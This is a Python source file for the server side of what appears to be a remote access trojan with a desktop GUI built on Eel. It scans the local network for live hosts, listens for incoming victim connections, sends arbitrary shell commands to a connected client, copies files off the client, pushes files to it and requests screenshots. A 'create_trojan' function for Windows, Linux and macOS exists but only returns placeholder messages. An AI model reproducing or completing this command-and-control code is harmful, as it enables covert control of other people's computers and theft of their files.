import eel
import threading
import os
import socket
import time
import platform



@eel.expose
def search_ip():
    networks = []
    ip = os.popen("ipconfig")
    for line in ip.readlines():
        if "IPv4 Address" in line:
            start = line.find(":")
            end = -1
            network = line[start + 2:end]
            networks.append(network)
            continue
    return networks


@eel.expose
def start_scan(network_to_scan):
    network = network_to_scan[:network_to_scan.rfind(".") + 1]
    clients = []
    threads = []
    lock = threading.Lock()

    for item in range(1, 255):
        test = network + str(item)
        t = threading.Thread(target=scanner, args=(test, clients, lock))
        t.start()
        threads.append(t)

    for thread in threads:
        thread.join()

    return clients


def scanner(ip_address, clients, lock):
    result = os.popen("ping {0} -n 1".format(ip_address)).read()
    if "TTL" in result:
        with lock:
            clients.append(ip_address)


# simple tcp server


@eel.expose
def get_ip(*net_n_port):
    global s
    global network
    global conn

    network = ""
    port = 8080
    for item in net_n_port:
        network = item
        if network == "":
            break
        print(network)
        network, port = network.split(":")
        port = int(port)
    if network == "":
        ip = os.popen("ipconfig")
        for line in ip.readlines():
            if "IPv4 Address" in line:
                start = line.find(":")
                end = -1
                network = line[start + 2:end]
                break
    s = socket.socket()
    s.bind((network, port))
    s.listen(1)
    conn, addr = s.accept()
    str1 = "connected on {0} port {1}".format(network, port)
    return str1


@eel.expose
def conn_TCP(command):
    str2 = None
    while True:
        if command == 'help':
            helpMe = """Usage: print various command to operate on the client.
              ----------------------------------------------------------------
              Special Commands:
              ---------------------
               'copy' - to copy a file from the client (example: copy file.txt)
               'send' - to send a file to the client (example: send file.txt)
               'screenshot' take client screenshot and save on the server
               'exit' - to close the connection
               ---------------------------------------------------------------
               """
            return helpMe
        elif command == '':
            return ''
        elif 'exit' in command:
            conn.send('exit'.encode())
            conn.close()
            str2 = "[----] connection terminated [----]"
            return str2
        elif 'copy' in command:
            str2 = copy_TCP(command)
            return str2
        elif 'send' in command:
            str2 = send_TCP(command)
            return str2
        elif 'screenshot' in command:
            str2  = send_TCP(command)
            return str2
        else:
            conn.send(command.encode())
            str2 = (conn.recv(1024).decode())
            while True:
                str1 = (conn.recv(1024).decode())
                if str1.endswith('DONE'):
                    str3 = str2 + str1
                    return str3[:-4]
                else:
                    str2 = str2 + str1



def copy_TCP(command):
    print("copy_TCP fun")
    conn.send(command.encode())
    copy, path = command.split()
    f = open('' + path, 'wb')
    while True:
        bits = conn.recv(1024)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4])
            f.close()
            str2 = '[+] File: {} - Copied successfully '.format(path)
            break
        if 'File not found'.encode() in bits:
            str2 = '[-] Unable to find the file: {}'.format(path)
            break
        f.write(bits)
    return str2


def send_TCP(command):
    conn.send(command.encode())
    send, path = command.split()
    print(path)
    time.sleep(2)
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            conn.send(packet)
            packet = f.read(1024)
        conn.send('DONE'.encode())
        str2 = "[+] File: {} - saved on client PC".format(path)
    else:
        conn.send('DONE'.encode())
        str2 = '[-] Unable to find the file: {} '.format(path)
    return str2


@eel.expose
def create_trojan(trojan_os):
    my_os = platform.system()
    if trojan_os == "Windows":
        str2 = "Windows trojan was created."
        return str2
    elif trojan_os == "Linux":
        str2 = "Linux trojan was created."
        return str2
    elif trojan_os == "Darwin":
        str2 = "Darwin trojan was created."
        return str2







@eel.expose
def eel_exit():
    SystemExit(0)


eel.init('web')

try:
    eel.start('index.html', size=(1500, 2000), port=0)  # python will select free ephemeral ports.
except (SystemExit, MemoryError, KeyboardInterrupt):
    print("Program Exit, Save Logs if Needed")
